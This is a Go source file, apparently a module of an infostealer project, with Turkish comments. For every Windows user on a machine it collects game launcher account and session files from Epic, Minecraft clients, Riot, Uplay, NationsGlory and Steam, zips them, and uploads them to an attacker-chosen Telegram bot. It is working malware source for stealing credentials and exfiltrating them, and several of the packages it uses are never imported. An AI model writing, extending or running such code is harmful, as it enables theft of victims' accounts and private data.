package games

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/benzoXdev/oxil/utils/fileutil"
	"github.com/benzoXdev/oxil/utils/hardware"
)

// Telegram yardımcı fonksiyonları (diğer modüllerden aynı)
func sendTextToTelegram(botToken, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
	}

	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post(url, "application/json", strings.NewReader(string(jsonData)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("sendMessage failed: %d", resp.StatusCode)
	}
	return nil
}

func sendZipToTelegram(botToken, chatID, caption, zipPath string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "Markdown")

	fileWriter, err := writer.CreateFormFile("document", filepath.Base(zipPath))
	if err != nil {
		return err
	}

	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		return err
	}

	writer.Close()

	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		bodyBytes, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("sendDocument failed: %d - %s", resp.StatusCode, string(bodyBytes))
	}

	return nil
}

func Run(botToken string, chatID string) {
	users := hardware.GetUsers()

	for _, user := range users {
		username := strings.Split(user, "\\")[2]
		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", username))
		os.MkdirAll(tempDir, os.ModePerm)
		defer os.RemoveAll(tempDir)

		paths := map[string]map[string]string{
			"Epic Games": {
				"Settings": filepath.Join(user, "AppData", "Local", "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
			},
			"Minecraft": {
				"Intent":     filepath.Join(user, "intentlauncher", "launcherconfig"),
				"Lunar":      filepath.Join(user, ".lunarclient", "settings", "game", "accounts.json"),
				"TLauncher":  filepath.Join(user, "AppData", "Roaming", ".minecraft", "TlauncherProfiles.json"),
				"Feather":    filepath.Join(user, "AppData", "Roaming", ".feather", "accounts.json"),
				"Meteor":     filepath.Join(user, "AppData", "Roaming", ".minecraft", "meteor-client", "accounts.nbt"),
				"Impact":     filepath.Join(user, "AppData", "Roaming", ".minecraft", "Impact", "alts.json"),
				"Novoline":   filepath.Join(user, "AppData", "Roaming", ".minecraft", "Novoline", "alts.novo"),
				"CheatBreakers": filepath.Join(user, "AppData", "Roaming", ".minecraft", "cheatbreaker_accounts.json"),
				"Microsoft Store": filepath.Join(user, "AppData", "Roaming", ".minecraft", "launcher_accounts_microsoft_store.json"),
				"Rise":       filepath.Join(user, "AppData", "Roaming", ".minecraft", "Rise", "alts.txt"),
				"Rise (Intent)": filepath.Join(user, "intentlauncher", "Rise", "alts.txt"),
				"Paladium":   filepath.Join(user, "AppData", "Roaming", "paladium-group", "accounts.json"),
				"PolyMC":     filepath.Join(user, "AppData", "Roaming", "PolyMC", "accounts.json"),
				"Badlion":    filepath.Join(user, "AppData", "Roaming", "Badlion Client", "accounts.json"),
			},
			"Riot Games": {
				"Config": filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Config"),
				"Data":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Data"),
				"Logs":   filepath.Join(user, "AppData", "Local", "Riot Games", "Riot Client", "Logs"),
			},
			"Uplay": {
				"Settings": filepath.Join(user, "AppData", "Local", "Ubisoft Game Launcher"),
			},
			"NationsGlory": {
				"Local Storage": filepath.Join(user, "AppData", "Roaming", "NationsGlory", "Local Storage", "leveldb"),
			},
		}

		found := ""

		for name, pathMap := range paths {
			destBase := filepath.Join(tempDir, username, name)
			os.MkdirAll(destBase, os.ModePerm)

			copied := false
			for fName, fPath := range pathMap {
				if fPath == "" {
					continue
				}

				destPath := filepath.Join(destBase, fName)
				var err error

				if filepath.Ext(fPath) != "" {
					// Dosya kopyala
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					err = fileutil.CopyFile(fPath, filepath.Join(destPath, filepath.Base(fPath)))
				} else {
					// Klasör kopyala
					err = fileutil.CopyDir(fPath, destPath)
				}

				if err == nil {
					copied = true
				}
			}

			if copied {
				found += fmt.Sprintf("\n✅ %s", name)
			}
		}

		if found == "" {
			os.RemoveAll(tempDir)
			continue
		}

		// Metin mesajı
		message := fmt.Sprintf(
			"*🎮 Oyun Hesapları Bulundu - %s*\n\n"+
				"```%s```",
			username,
			found,
		)

		_ = sendTextToTelegram(botToken, chatID, message)

		// ZIP oluştur ve gönder
		tempZip := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s.zip", username))
		if err := fileutil.Zip(tempDir, tempZip); err != nil {
			os.RemoveAll(tempDir)
			continue
		}

		caption := fmt.Sprintf("Oyun launcher dosyaları - %s", username)
		_ = sendZipToTelegram(botToken, chatID, caption, tempZip)

		os.Remove(tempZip)
		os.RemoveAll(tempDir)
	}

	// Steam kısmı ayrı
	steamTempDir := filepath.Join(os.TempDir(), "steam-temp")
	os.MkdirAll(steamTempDir, os.ModePerm)
	defer os.RemoveAll(steamTempDir)

	steamPath := "C:\\Program Files (x86)\\Steam\\config"
	if !fileutil.IsDir(steamPath) {
		return
	}

	if err := fileutil.CopyDir(steamPath, steamTempDir); err != nil {
		return
	}

	steamZip := filepath.Join(os.TempDir(), "steam.zip")
	if err := fileutil.Zip(steamTempDir, steamZip); err != nil {
		return
	}
	defer os.Remove(steamZip)

	// Steam metni
	steamMessage := "*🎮 Steam Config Dosyaları Bulundu*\n\n`✅✅✅`"
	_ = sendTextToTelegram(botToken, chatID, steamMessage)

	// Steam ZIP'ini gönder
	caption := "Steam config dosyaları (config klasörü)"
	_ = sendZipToTelegram(botToken, chatID, caption, steamZip)
}